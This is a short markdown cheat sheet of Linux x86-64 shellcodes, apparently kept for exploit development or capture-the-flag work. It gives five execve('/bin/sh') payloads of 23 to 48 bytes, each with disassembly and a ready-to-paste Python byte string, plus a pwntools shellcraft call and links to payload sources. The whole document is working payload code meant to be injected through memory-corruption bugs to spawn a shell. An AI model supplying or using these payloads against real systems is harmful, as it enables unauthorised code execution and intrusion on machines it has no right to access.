# &#35; linux x64 exec shellcodes
#### link : <https://defuse.ca/online-x86-assembler.htm/>

```bash

# 48 bytes
>>> context.clear()
>>> context.os='linux'
>>> context.arch='amd64'
>>> asm(shellcraft.amd64.linux.sh())
b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
>>>


# 26 bytes
0:  31 c0                   xor    eax,eax
2:  50                      push   rax
3:  48 31 d2                xor    rdx,rdx
6:  48 31 f6                xor    rsi,rsi
9:  48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f2f6e69622f
10: 2f 73 68
13: 53                      push   rbx
14: 54                      push   rsp
15: 5f                      pop    rdi
16: b0 3b                   mov    al,0x3b
18: 0f 05                   syscall

shellcode = b"\x31\xc0\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"


# 23 bytes
http://shell-storm.org/shellcode/files/shellcode-585.php
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"




# 30 bytes
0:  b0 3b                   mov    al,0x3b
2:  48 31 f6                xor    rsi,rsi
5:  48 31 d2                xor    rdx,rdx
8:  48 8d 3d f8 ff ff ff    lea    rdi,[rip+0xfffffffffffffff8]        # 7 <_main+0x7>
f:  48 b9 2f 62 69 6e 2f    movabs rcx,0x68732f6e69622f
16: 73 68 00
19: 48 89 0f                mov    QWORD PTR [rdi],rcx
1c: 0f 05                   syscall

shellcode = b"\xB0\x3B\x48\x31\xF6\x48\x31\xD2\x48\x8D\x3D\xF8\xFF\xFF\xFF\x48\xB9\x2F\x62\x69\x6E\x2F\x73\x68\x00\x48\x89\x0F\x0F\x05"



# 48 bytes
0:  6a 68                   push   0x68
2:  48 b8 2f 62 69 6e 2f    movabs rax,0x732f2f2f6e69622f
9:  2f 2f 73
c:  50                      push   rax
d:  48 89 e7                mov    rdi,rsp
10: 68 72 69 01 01          push   0x1016972
15: 81 34 24 01 01 01 01    xor    DWORD PTR [rsp],0x1010101
1c: 31 f6                   xor    esi,esi
1e: 56                      push   rsi
1f: 6a 08                   push   0x8
21: 5e                      pop    rsi
22: 48 01 e6                add    rsi,rsp
25: 56                      push   rsi
26: 48 89 e6                mov    rsi,rsp
29: 31 d2                   xor    edx,edx
2b: 6a 3b                   push   0x3b
2d: 58                      pop    rax
2e: 0f 05                   syscall

shellcode = b"\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05"

```
